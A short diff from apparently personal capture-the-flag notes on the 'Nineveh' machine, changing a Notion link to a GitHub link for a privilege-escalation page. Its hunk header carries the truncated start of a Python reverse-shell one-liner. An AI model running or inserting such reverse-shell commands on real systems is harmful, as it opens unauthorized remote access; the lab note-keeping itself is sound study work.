@@ -118,4 +118,4 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 
 ![image.png](image%2025.png)
 
-[Nineveh提權](https://www.notion.so/Nineveh-34b6b41a37848095b592ce3bc67b7e61?pvs=21)
+[Nineveh提權](https://github.com/jeremypickup/cybersecurity-notes/blob/main/Nineveh/Nineveh%20PE/Nineveh%E6%8F%90%E6%AC%8A%20.md)
